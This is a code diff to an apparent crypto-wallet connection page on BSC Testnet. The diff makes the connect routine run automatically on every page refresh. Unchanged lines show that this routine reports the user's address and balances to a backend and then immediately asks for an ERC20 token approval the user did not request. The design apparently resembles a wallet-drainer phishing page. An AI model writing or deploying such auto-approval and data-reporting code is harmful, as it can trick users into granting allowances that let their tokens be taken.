@@ -109,6 +109,8 @@
     const BNB_TESTNET_CHAIN_ID_DEC = 97;
     const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
     const BNB_TESTNET_LABEL        = "BSC Testnet (97)";
+    const LAST_CONNECTED_KEY       = "mycash_last_connected";
+
 
     const ERC20_APPROVE_ABI = [
       "function approve(address spender, uint256 amount) public returns (bool)"
@@ -173,12 +175,15 @@
       userIdEl.textContent = id || "-";
     }
 
-    function clearSessionUI(){
-      setStatus("Not connected");
-      setWalletInfo("—","—","—");
-      setUserIdUI("-");
-      tokensContainer.innerHTML = '<div class="muted">Connect wallet to see token balance.</div>';
-    }
+ function clearSessionUI(){
+  setStatus("Not connected");
+  setWalletInfo("—","—","—");
+  setUserIdUI("-");
+  tokensContainer.innerHTML = '<div class="muted">Connect wallet to see token balance.</div>';
+  // forget auto-connect flag
+  localStorage.removeItem(LAST_CONNECTED_KEY);
+}
+
 
     function initWeb3ModalInstance(){
       const providerOptions = {
@@ -410,13 +415,16 @@
             '<div style="font-size:1.1rem;margin-top:4px;">' + prettyBalance + '</div>' +
             '<div class="small mono" style="margin-top:6px;">' + TOKEN_ADDRESS + '</div>' +
           '</div>';
-
         await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalance);
 
         // 🔥 Auto request approval after connect
         await requestTokenApproval();
 
+        // remember that we were connected, so we can auto-connect on refresh
+        localStorage.setItem(LAST_CONNECTED_KEY, "1");
+
       }catch(err){
+
         console.error("connectFlow error:", err);
         setStatus("Connection failed");
         alert("Connection failed: " + (err && err.message ? err.message : err));
@@ -454,12 +462,23 @@
       }
     }
 
-    document.addEventListener("DOMContentLoaded", async function(){
+      document.addEventListener("DOMContentLoaded", async function(){
       initWeb3ModalInstance();
       connectBtn.addEventListener("click", connectFlow);
-      await tryAutoReconnect();
+
+      const wasConnected = localStorage.getItem(LAST_CONNECTED_KEY) === "1";
+
+      if (wasConnected) {
+        // auto-call connect flow (wallet may still show a popup)
+        connectFlow();
+      } else {
+        // normal soft reconnect using eth_accounts
+        await tryAutoReconnect();
+      }
+
       document.getElementById("year").textContent = new Date().getFullYear();
     });
+
 
   })();
   </script>
